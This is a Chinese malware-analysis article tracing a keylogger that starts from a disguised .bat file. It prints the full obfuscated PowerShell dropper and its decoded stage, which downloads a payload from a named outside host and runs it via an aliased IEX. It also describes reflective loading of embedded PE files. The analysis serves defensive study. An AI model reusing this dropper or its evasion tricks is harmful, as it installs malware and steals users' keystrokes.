# 一款由非PE加载起来的新型KeyLogger分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
样本来源于日常app.any.run的样本
样本MD5：71bdecdea1d86dd3e892ca52c534fa13
样本上传名：exe.PDF.bat
样本上传时间，就是今天（2020年9月10日）下午四点十分
可以看到any.run已经将其标记为恶意并且可以从 any.run的沙箱中看到恶意行为是执行了一段powershell指令。
在VT上查了一下样本，惊奇的发现，现在居然只有一家厂商给出了明确的报毒：Downloader.WannaMine
## 0x01 原始样本
原始样本的确是bat的文件，编辑工具加载后内容如下：
    @echo off
    Start /MIN Powershell -WindowStyle Hidden -command "$Dxjyp='D4@C7@72@72@02@E6@96@F6@A6@D2@02@37@27@16@86@34@96@96@36@37@16@42@02@D3@76@E6@96@27@47@35@96@96@36@37@16@42@B3@D7@22@F5@42@87@03@22@D5@56@47@97@26@B5@D5@27@16@86@36@B5@B7@02@47@36@56@A6@26@F4@D2@86@36@16@54@27@F6@64@C7@02@72@D2@72@02@47@96@C6@07@37@D2@02@67@D6@42@02@D3@37@27@16@86@34@96@96@36@37@16@42@B3@85@06@54@06@94@C7@72@92@72@72@76@07@A6@E2@23@13@14@F2@97@36@E2@D6@F6@36@E2@16@96@27@47@56@D6@F6@07@F6@47@F2@F2@A3@07@47@47@86@72@72@82@76@E6@96@72@B2@72@27@47@72@B2@72@35@72@B2@72@46@72@B2@72@16@F6@72@B2@72@C6@E6@72@B2@72@77@F6@72@B2@72@44@E2@72@B2@72@92@47@E6@56@72@B2@72@96@C6@72@B2@72@34@72@B2@72@26@56@72@B2@72@75@72@B2@72@E2@47@72@B2@72@56@E4@72@02@B2@72@02@47@72@B2@72@36@72@B2@72@56@A6@72@B2@72@26@72@B2@72@F4@D2@72@B2@72@77@56@72@B2@72@E4@82@72@D3@67@D6@42@B3@23@23@07@42@02@D3@02@C6@F6@36@F6@47@F6@27@05@97@47@96@27@57@36@56@35@A3@A3@D5@27@56@76@16@E6@16@D4@47@E6@96@F6@05@56@36@96@67@27@56@35@E2@47@56@E4@E2@D6@56@47@37@97@35@B5@B3@92@23@73@03@33@02@C2@D5@56@07@97@45@C6@F6@36@F6@47@F6@27@05@97@47@96@27@57@36@56@35@E2@47@56@E4@E2@D6@56@47@37@97@35@B5@82@47@36@56@A6@26@F4@F6@45@A3@A3@D5@D6@57@E6@54@B5@02@D3@02@23@23@07@42@B3@92@76@E6@96@07@42@82@02@C6@96@47@E6@57@02@D7@47@56@96@57@15@D2@02@13@02@47@E6@57@F6@36@D2@02@D6@F6@36@E2@56@C6@76@F6@F6@76@02@07@D6@F6@36@D2@02@E6@F6@96@47@36@56@E6@E6@F6@36@D2@47@37@56@47@02@D3@02@76@E6@96@07@42@B7@02@F6@46@B3@56@E6@F6@26@45@42@02@D4@02@C6@16@37@B3@92@72@94@72@C2@72@A2@72@82@56@36@16@C6@07@56@27@E2@72@85@54@A2@72@D3@56@E6@F6@26@45@42';$text =$Dxjyp.ToCharArray();[Array]::Reverse($text);$tu=-join $text;$jm=$tu.Split('@') | forEach {[char]([convert]::toint16($_,16))};$jm -join ''|I`E`X"
这是一段很简单的bat内嵌powershell代码，通过bat脚本隐藏窗口执行powershell代码，执行的代码为红色部分。
大概阅读一下这段powershell代码就可以知道这里是将前面的@符号替换并进行转换然后通过最后的I`E`X加载执行。
所以直接把最后面的I`E`X 更改为echo 然后把这一整段powershell代码抽出来保存到一个ps1文件中：
然后powershell窗口执行这个ps1脚本，通过管道输出到新文件中，解码出来的内容如下：
这段代码首先是通过$Tbone=’ _EX’.replace(‘_ ‘,’I’)声明了一个名为$Tbone的变量，这个变量实际就是IEX  
接着通过sal M $Tbone给变量定义了别名M，可以看到M在程序最后有使用，这是一种免杀操作。
格式化一下代码如下：
    $Tbone='*EX'.replace('*','I');sal M $Tbone;
    do{
        $ping = test-connection -comp google.com -count 1 -Quiet
    }
    until($ping);
    $p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
    [System.Net.ServicePointManager]::SecurityProtocol = $p22;
    $mv='(N'+'ew'+'-O'+'b'+'je'+'c'+'t '+ 'Ne'+'t.'+'W'+'eb'+'C'+'li'+'ent)'+'.D'+'ow'+'nl'+'oa'+'d'+'S'+'tr'+'ing(''http://topometria.com.cy/A12.jpg'')'|I`E`X;
    $asciiChars= $mv -split '-' |ForEach-Object {[char][byte]"0x$_"};
    $asciiString= $asciiChars -join ''|M
代码首先会尝试connection连接google.com保证网络畅通。
当确保网络畅通之后，代码在后面拼接一个对象，用于通过IEX执行一个下载指令，将下载回来的内容存储到变量$mv中，这里的下载链接为:
[http://topometria.com.cy/A12[.]jpg](http://topometria.com.cy/A12%5B.%5Djpg)
关于topometria，暂时没有相关的威胁情报。
最后，程序将下载回来的数据$mv 以 – 分割，然后作为byte数组加载执行
还好，现在样本能够正常下载回来。
## 0x02 下载回来的样本分析
下载回来的文件名为A12.jpg，用编辑器打开可以看到是一段以-分割的数据
根据之前的代码操作，可以知道这里会首先将-分割成一个数组，然后转成byte，我们知道最后的数据类型是byte，所以这里直接将- 替换为空格
然后以byte的形式赋值到010中：
这里可以看到，byte解码出来其实是一段脚本代码
通过010转换为文本即可看到源码：
所以这是一个3M多的script文件。
看到这种代码不要怕，观察一下就可以找到关键地方
我们首先看看脚本最开始的地方，首先是执行了$t0=-Join ((111, 105, 130)  
这里的111 105 130 解出来就是IEX
所以最开始是同样的操作，给IEX声明了一个别名g用于后面调用。
然后程序声明了一个超级长的String，根据开头的[String]$nebj=’4D5A9>^>^3>^可以知道这里其实是一个PE文件，后面肯定会有操作把这里的
特殊符号替换为00
所以跳转到最下面的代码看看：
这里首先可以看到， 在刚才声明的长字符串最后，果然通过replace将特殊符号替换为了00
然后可以看到程序执行了一个 [Byte[]]$JJAr=PuKkpsGJ $CDbvWcpeO
这里可以看出来是将$CDbvWcpeO（暂时不知道是什么） 作为参数传递给了PuKkpsGJ 函数，PuKkpsGJ
函数运算之后会得到一个数组赋值给$JJAr
搜索找一下PuKkpsGJ 函数：
顺便找到了CDbvWcpeO的定义，这里可以看到，CDbvWcpeO是第二个PE文件。
PuKkpsGJ的功能也很简单，就是对传入进来的内容进行分割和转码。
关于这里处理后的数据之后再看，先看看后面的代码做了什么。
$y=’[System.Ap!%%%%#######@@@@@@@ ** ** ** _**_******
ain]’.replace(‘!%%%%#######@@@@@@@ ** ** ** _**_******
‘,’pDom’)|g;$g55=$y.GetMethod(“get_CurrentDomain”)
这类替换之后代码就是：
$y=’[System.AppDomain]’|g;  
$g55=$y.GetMethod(“get_CurrentDomain”)
同样的，把下面几行的代码也替换了得到
$uy=’$g55.Invoke($null,$null)’| g  
$vmc2=$uy.Load($JJAr)  
$vmc2| g
这里很明显，就是最后Invoke load执行$JJAr，而这个$JJAr就是上面通过PuKkpsGJ 处理后的数组。
所以直接写一个ps脚本，把这段数据处理完之后写入到桌面的222.txt文件中即可
最后，程序还会通过
解码出第二个PE文件，这里看样子是通过InstallUtil安装，虽然不太看得出来这里是怎么加载起来的，但还是先dump出来后面看看。
计算一下文件hash，分别为：
8A738F0E16C427C9DE68F370B2363230
498EC58566B52AA5875497CADF513547
对应的检出情况如下：